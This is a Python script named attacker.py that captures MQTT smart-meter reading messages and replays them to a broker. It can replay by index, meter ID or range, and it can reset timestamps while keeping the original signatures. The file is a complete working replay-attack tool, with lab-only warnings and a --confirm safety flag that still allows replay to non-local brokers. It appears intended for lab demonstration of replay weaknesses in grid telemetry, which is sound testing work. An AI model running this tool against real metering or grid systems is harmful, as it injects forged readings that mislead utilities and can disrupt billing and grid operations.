#!/usr/bin/env python3
"""
attacker.py - capture & replay MQTT meter messages for lab/demo only.

Usage examples:
# Capture mode (default)
python attacker.py --mode capture

# Replay the first captured message after 5s (requires --confirm)
python attacker.py --mode replay --index 0 --delay 5 --confirm

# Replay all messages for a particular meterID
python attacker.py --mode replay --meter "0xAbC..." --confirm

# Replay range (index from-to)
python attacker.py --mode replay --from-index 0 --to-index 10 --confirm

# Replay and modify timestamp to "now" before publishing
python attacker.py --mode replay --index 0 --preserve-ts false --confirm

Note: This tool is intended for controlled lab testing only. Do not use
on production or third-party networks.
"""

import os
import json
import time
import argparse
import threading
from typing import List, Dict, Any
from datetime import datetime

import paho.mqtt.client as mqtt

# ANSI color codes for terminal output
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

def print_banner(text: str, color=Colors.RED):
    """Print a stylized banner"""
    width = 100
    print(f"\n{color}{'=' * width}")
    print(f"{text.center(width)}")
    print(f"{'=' * width}{Colors.END}\n")

def print_box(title: str, content: dict, color=Colors.GREEN):
    """Print content in a box format"""
    if not content:
        return
    
    max_key_len = max(len(str(k)) for k in content.keys())
    width = max(80, max_key_len + 50)
    
    print(f"\n{color}┌{'─' * (width - 2)}┐")
    print(f"│ {Colors.BOLD}{title}{Colors.END}{color}{' ' * (width - len(title) - 3)}│")
    print(f"├{'─' * (width - 2)}┤")
    
    for key, value in content.items():
        key_str = f"{key}:".ljust(max_key_len + 2)
        value_str = str(value)
        if len(value_str) > width - max_key_len - 8:
            value_str = value_str[:width - max_key_len - 11] + "..."
        print(f"│ {Colors.BOLD}{key_str}{Colors.END}{color} {value_str}{' ' * (width - len(key_str) - len(value_str) - 3)}│")
    
    print(f"└{'─' * (width - 2)}┘{Colors.END}\n")

def print_success(message: str):
    print(f"{Colors.GREEN}✓ {message}{Colors.END}")

def print_info(message: str):
    print(f"{Colors.CYAN}ℹ {message}{Colors.END}")

def print_warning(message: str):
    print(f"{Colors.YELLOW}⚠ {message}{Colors.END}")

def print_error(message: str):
    print(f"{Colors.RED}✗ {message}{Colors.END}")

def format_timestamp(ts: int) -> str:
    """Convert Unix timestamp to readable format"""
    return datetime.fromtimestamp(ts).strftime('%Y-%m-%d %H:%M:%S')

# ----------------- CONFIG -----------------
DEFAULT_BROKER = "localhost"
DEFAULT_PORT = 1883
DEFAULT_TOPIC = "grid/readings"
CAPTURE_FILE = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "data", "captures.json"))
# ------------------------------------------

os.makedirs(os.path.dirname(CAPTURE_FILE), exist_ok=True)


def load_captures() -> List[Dict[str, Any]]:
    """Load captures from file, handling empty/corrupted files"""
    if not os.path.exists(CAPTURE_FILE):
        return []
    
    try:
        # Check if file is empty
        if os.path.getsize(CAPTURE_FILE) == 0:
            print_warning("Capture file is empty, initializing new capture list")
            return []
        
        with open(CAPTURE_FILE, "r") as f:
            data = json.load(f)
            if not isinstance(data, list):
                print_warning("Capture file format invalid, initializing new capture list")
                return []
            return data
    except json.JSONDecodeError as e:
        print_error(f"Corrupted capture file detected: {e}")
        # Backup corrupted file
        backup_path = CAPTURE_FILE + f".corrupted.{int(time.time())}"
        try:
            os.rename(CAPTURE_FILE, backup_path)
            print_warning(f"Backed up corrupted file to: {backup_path}")
        except Exception:
            pass
        return []
    except Exception as e:
        print_error(f"Error loading captures: {e}")
        return []


def save_captures(captures: List[Dict[str, Any]]):
    """Save captures to file with error handling"""
    try:
        with open(CAPTURE_FILE, "w") as f:
            json.dump(captures, f, indent=2)
    except Exception as e:
        print_error(f"Failed to save captures: {e}")


def timestamp_now():
    return int(time.time())


class Attacker:
    def __init__(self, broker=DEFAULT_BROKER, port=DEFAULT_PORT, topic=DEFAULT_TOPIC):
        self.broker = broker
        self.port = port
        self.topic = topic
        self.captures = load_captures()
        self.client = mqtt.Client(client_id="attacker_capture", callback_api_version=mqtt.CallbackAPIVersion.VERSION1)
        self.client.on_connect = self.on_connect
        self.client.on_message = self.on_message
        
        # Statistics
        self.stats = {
            "total_captured": len(self.captures),
            "total_replayed": 0,
            "start_time": time.time()
        }

    def on_connect(self, client, userdata, flags, rc):
        if rc == 0:
            print_success(f"Connected to MQTT broker at {self.broker}:{self.port}")
            client.subscribe(self.topic)
            print_success(f"Subscribed to topic: {self.topic}")
        else:
            print_error(f"Failed to connect (rc={rc})")

    def on_message(self, client, userdata, msg):
        try:
            payload_text = msg.payload.decode('utf-8')
            payload = json.loads(payload_text)
        except Exception as e:
            print_error(f"Failed to parse message: {e}")
            return

        record = {
            "captured_at": timestamp_now(),
            "topic": msg.topic,
            "payload": payload
        }
        self.captures.append(record)
        
        # Persist immediately to avoid data loss
        save_captures(self.captures)
        self.stats["total_captured"] = len(self.captures)
        
        idx = len(self.captures) - 1
        
        # Display captured message
        capture_data = {
            "Capture Index": idx,
            "Captured At": format_timestamp(record["captured_at"]),
            "Topic": msg.topic,
            "─── Message Content ───": "",
            "Meter ID": payload.get('meterID', 'N/A')[:20] + "...",
            "Sequence": payload.get('seq', 'N/A'),
            "Timestamp": format_timestamp(payload.get('ts', 0)),
            "Value": f"{payload.get('value', 'N/A')} W",
            "Signature": (payload.get('signature', '')[:30] + "...") if payload.get('signature') else "N/A",
            "─── Statistics ───": "",
            "Total Captured": self.stats["total_captured"],
            "Capture File": CAPTURE_FILE
        }
        
        print_box(f"🎯 Captured Message #{idx}", capture_data, Colors.YELLOW)
        
        print(f"{Colors.CYAN}{'─' * 100}{Colors.END}\n")

    def start_capture(self):
        print_banner("⚠️  ATTACKER TOOL - CAPTURE MODE ⚠️", Colors.RED)
        
        config_data = {
            "Mode": "CAPTURE",
            "Warning": "⚠️  LAB/DEMO USE ONLY",
            "Broker": f"{self.broker}:{self.port}",
            "Topic": self.topic,
            "Capture File": CAPTURE_FILE,
            "Previously Captured": self.stats["total_captured"],
            "Status": "ACTIVE"
        }
        print_box("Attacker Configuration", config_data, Colors.YELLOW)
        
        try:
            print_info(f"Connecting to MQTT broker at {self.broker}:{self.port}...")
            self.client.connect(self.broker, self.port, keepalive=60)
        except Exception as e:
            print_error(f"Failed to connect to broker: {e}")
            return
        
        print_warning("Capturing MQTT messages... Press Ctrl-C to stop")
        print(f"{Colors.CYAN}{'─' * 100}{Colors.END}\n")
        
        try:
            self.client.loop_forever()
        except KeyboardInterrupt:
            print_warning("\n\nStopping capture...")
            
            final_stats = {
                "Total Captured": self.stats["total_captured"],
                "Session Duration": f"{time.time() - self.stats['start_time']:.0f}s",
                "Capture File": CAPTURE_FILE,
                "Status": "STOPPED"
            }
            print_box("📊 Capture Session Complete", final_stats, Colors.YELLOW)

    # ---------- REPLAY LOGIC ----------
    def _publish(self, payload_obj: Dict[str, Any], target_topic: str, preserve_ts: bool):
        # Optionally update ts to now (or leave original)
        p = dict(payload_obj)  # shallow copy
        original_ts = p.get('ts', 0)
        
        if not preserve_ts:
            p['ts'] = timestamp_now()
        
        # Display what we're about to replay
        replay_details = {
            "Target Topic": target_topic,
            "Meter ID": p.get('meterID', 'N/A')[:20] + "...",
            "Sequence": p.get('seq', 'N/A'),
            "Original Timestamp": format_timestamp(original_ts),
            "Replayed Timestamp": format_timestamp(p['ts']),
            "Timestamp Modified": "YES" if not preserve_ts else "NO",
            "Value": f"{p.get('value', 'N/A')} W",
            "Signature": (p.get('signature', '')[:30] + "...") if p.get('signature') else "N/A"
        }
        print_box("🚀 Replaying Message", replay_details, Colors.RED)
        
        # publish raw JSON exactly as-is (signature field remains unchanged)
        pub = mqtt.Client(client_id=f"attacker_pub_{int(time.time()*1000)}", callback_api_version=mqtt.CallbackAPIVersion.VERSION1)
        pub.connect(self.broker, self.port, 60)
        pub.loop_start()
        payload_text = json.dumps(p, separators=(",", ":"), sort_keys=False)
        pub.publish(target_topic, payload_text)
        
        # short sleep to ensure message pushes out, then stop loop
        time.sleep(0.2)
        pub.loop_stop()
        pub.disconnect()
        
        self.stats["total_replayed"] += 1
        print_success(f"Message replayed successfully (Total replayed: {self.stats['total_replayed']})")

    def replay_by_index(self, index: int, delay: float = 0.0, preserve_ts: bool = True, target_topic: str = None):
        if index < 0 or index >= len(self.captures):
            print_error(f"Invalid index: {index} (available: 0-{len(self.captures)-1})")
            return
        
        rec = self.captures[index]
        tgt = target_topic or rec["topic"] or self.topic
        
        replay_config = {
            "Mode": "REPLAY BY INDEX",
            "Index": index,
            "Delay": f"{delay}s",
            "Preserve Timestamp": "YES" if preserve_ts else "NO",
            "Target Topic": tgt,
            "Original Capture Time": format_timestamp(rec["captured_at"])
        }
        print_box("🎯 Replay Configuration", replay_config, Colors.YELLOW)
        
        if delay > 0:
            print_info(f"Waiting {delay}s before replay...")
            time.sleep(delay)
        
        self._publish(rec["payload"], tgt, preserve_ts)
        print(f"{Colors.CYAN}{'─' * 100}{Colors.END}\n")

    def replay_by_meter(self, meter_id: str, delay: float = 0.0, preserve_ts: bool = True, target_topic: str = None, limit: int = None):
        matches = [ (i,r) for i,r in enumerate(self.captures) if r["payload"].get("meterID","").lower() == meter_id.lower() ]
        
        if not matches:
            print_error(f"No captures found for meter: {meter_id}")
            return
        
        if limit:
            matches = matches[:limit]
        
        replay_config = {
            "Mode": "REPLAY BY METER",
            "Meter ID": meter_id[:20] + "...",
            "Matching Captures": len(matches),
            "Limit": limit if limit else "None",
            "Delay Between Messages": f"{delay}s",
            "Preserve Timestamp": "YES" if preserve_ts else "NO",
            "Target Topic": target_topic or self.topic
        }
        print_box("🎯 Meter Replay Configuration", replay_config, Colors.YELLOW)
        
        for idx, (i, rec) in enumerate(matches, 1):
            tgt = target_topic or rec["topic"] or self.topic
            print_info(f"Replaying message {idx}/{len(matches)} (index {i})")
            self._publish(rec["payload"], tgt, preserve_ts)
            if idx < len(matches):
                time.sleep(delay)
        
        print_success(f"Completed replaying {len(matches)} messages for meter {meter_id[:20]}...")
        print(f"{Colors.CYAN}{'─' * 100}{Colors.END}\n")

    def replay_range(self, start: int, end: int, delay_between: float = 0.5, preserve_ts: bool = True, target_topic: str = None):
        start = max(0, start)
        end = min(len(self.captures)-1, end)
        
        if start > end:
            print_error("Invalid range: start > end")
            return
        
        total = end - start + 1
        
        replay_config = {
            "Mode": "REPLAY RANGE",
            "Start Index": start,
            "End Index": end,
            "Total Messages": total,
            "Delay Between Messages": f"{delay_between}s",
            "Preserve Timestamp": "YES" if preserve_ts else "NO",
            "Target Topic": target_topic or self.topic
        }
        print_box("🎯 Range Replay Configuration", replay_config, Colors.YELLOW)
        
        for i in range(start, end+1):
            rec = self.captures[i]
            tgt = target_topic or rec["topic"] or self.topic
            print_info(f"Replaying message {i-start+1}/{total} (index {i})")
            self._publish(rec['payload'], tgt, preserve_ts)
            if i < end:
                time.sleep(delay_between)
        
        print_success(f"Completed replaying {total} messages")
        print(f"{Colors.CYAN}{'─' * 100}{Colors.END}\n")

    def replay_all(self, delay_between: float = 0.2, preserve_ts: bool = True, target_topic: str = None, limit: int = None):
        n = len(self.captures) if limit is None else min(limit, len(self.captures))
        
        replay_config = {
            "Mode": "REPLAY ALL",
            "Total Available": len(self.captures),
            "Replaying": n,
            "Limited": "YES" if limit else "NO",
            "Delay Between Messages": f"{delay_between}s",
            "Preserve Timestamp": "YES" if preserve_ts else "NO",
            "Target Topic": target_topic or self.topic
        }
        print_box("🎯 Replay All Configuration", replay_config, Colors.YELLOW)
        
        for i in range(n):
            rec = self.captures[i]
            tgt = target_topic or rec["topic"] or self.topic
            print_info(f"Replaying message {i+1}/{n} (index {i})")
            self._publish(rec['payload'], tgt, preserve_ts)
            if i < n-1:
                time.sleep(delay_between)
        
        print_success(f"Completed replaying {n} messages")
        print(f"{Colors.CYAN}{'─' * 100}{Colors.END}\n")


# ----------------- CLI -----------------
def parse_args():
    p = argparse.ArgumentParser(description="Capture & replay MQTT meter messages (lab/demo only).")
    p.add_argument("--mode", choices=["capture", "replay"], default="capture", help="capture or replay mode")
    p.add_argument("--broker", default=DEFAULT_BROKER, help="MQTT broker host (default: localhost)")
    p.add_argument("--port", type=int, default=DEFAULT_PORT, help="MQTT broker port")
    p.add_argument("--topic", default=DEFAULT_TOPIC, help="MQTT topic to subscribe/publish")
    # replay options:
    p.add_argument("--index", type=int, help="replay the capture at this index")
    p.add_argument("--from-index", type=int, dest="from_index", help="replay starting index (inclusive)")
    p.add_argument("--to-index", type=int, dest="to_index", help="replay ending index (inclusive)")
    p.add_argument("--meter", help="replay captures for this meterID (case-insensitive)")
    p.add_argument("--delay", type=float, default=0.0, help="delay before the first replay in seconds")
    p.add_argument("--delay-between", type=float, default=0.5, help="delay between messages when replaying multiple")
    p.add_argument("--preserve-ts", choices=["true", "false"], default="true", help="preserve original ts in replay (true) or set to now (false)")
    p.add_argument("--target-topic", help="publish to a different topic than original")
    p.add_argument("--limit", type=int, help="limit number of messages when replaying by meter or all")
    # safety:
    p.add_argument("--confirm", action="store_true", help="REQUIRED to perform replay actions (safety)")
    return p.parse_args()


def main():
    args = parse_args()
    atk = Attacker(broker=args.broker, port=args.port, topic=args.topic)

    if args.mode == "capture":
        # start capturing and appending to CAPTURE_FILE
        atk.start_capture()
        return

    # REPLAY mode
    print_banner("⚠️  ATTACKER TOOL - REPLAY MODE ⚠️", Colors.RED)
    
    # safety checks:
    if args.broker != "localhost" and not args.confirm:
        print_error("Broker is not localhost. If you really want to replay to a non-local broker, re-run with --confirm")
        return
    
    if not args.confirm:
        print_error("⚠️  SAFETY CHECK FAILED")
        print_warning("Replay operations require --confirm to avoid accidental misuse")
        print_info("Add --confirm flag and re-run the command")
        return

    # ensure captures loaded
    atk.captures = load_captures()
    if len(atk.captures) == 0:
        print_error("No captures available to replay")
        print_info("Run in capture mode first: python attacker.py --mode capture")
        return

    # Display available captures summary
    summary_data = {
        "Available Captures": len(atk.captures),
        "Capture File": CAPTURE_FILE,
        "Broker": f"{args.broker}:{args.port}",
        "Target Topic": args.target_topic or args.topic,
        "Safety Confirmed": "✓ YES"
    }
    print_box("📋 Replay Session Info", summary_data, Colors.BLUE)

    preserve_ts = True if args.preserve_ts == "true" else False

    # single index replay
    if args.index is not None:
        atk.replay_by_index(index=args.index, delay=args.delay, preserve_ts=preserve_ts, target_topic=args.target_topic)
        return

    # meter-specific replay
    if args.meter:
        atk.replay_by_meter(meter_id=args.meter, delay=args.delay or args.delay_between, preserve_ts=preserve_ts, target_topic=args.target_topic, limit=args.limit)
        return

    # range replay
    if args.from_index is not None or args.to_index is not None:
        start = args.from_index if args.from_index is not None else 0
        end = args.to_index if args.to_index is not None else (len(atk.captures)-1)
        atk.replay_range(start=start, end=end, delay_between=args.delay_between, preserve_ts=preserve_ts, target_topic=args.target_topic)
        return

    # default: replay all
    atk.replay_all(delay_between=args.delay_between, preserve_ts=preserve_ts, target_topic=args.target_topic, limit=args.limit)


if __name__ == "__main__":
    main()